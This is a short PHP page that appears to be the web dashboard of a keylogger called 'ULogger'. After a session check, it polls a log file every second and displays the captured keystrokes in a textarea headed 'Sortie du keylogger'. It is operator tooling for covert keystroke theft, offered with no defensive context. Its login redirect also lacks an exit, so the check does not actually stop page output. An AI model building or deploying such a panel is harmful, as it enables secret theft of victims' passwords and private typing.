<?php include 'header.php';
 
if (!isset($_SESSION['login'])) 
   header("location:".$domaine."?page=login");
 
 
?>
  <script>
  function getLog() {
    $.ajax({
        url: '<?php echo $file ?>',
        dataType: 'text',
        success: function(text) {
            $("#containerKey").text(text);
            setTimeout(getLog, 1000);  
        }
    })
  }
  getLog();
  $(document).ready(function(){
  $('#myModal').on('shown.bs.modal', function () {
    $('#exampleModalCenter').trigger('focus')
  })
  });
  </script>
    <!-- Page Content -->
    <div class="container">
      <div class="row">
        <div class="col-lg-12 text-center"><br />
          <h1 class="mt-5"><img src="<?php echo $domaine ?>pages/logo.png" height="80" width="80"><br />ULogger</h1>
          <p class="lead">Sortie du keylogger:</p> 
 	  <textarea id="containerKey" rows="4" cols="50"><br />

        </div>
      </div>
    </div>

<?php include 'footers.php';

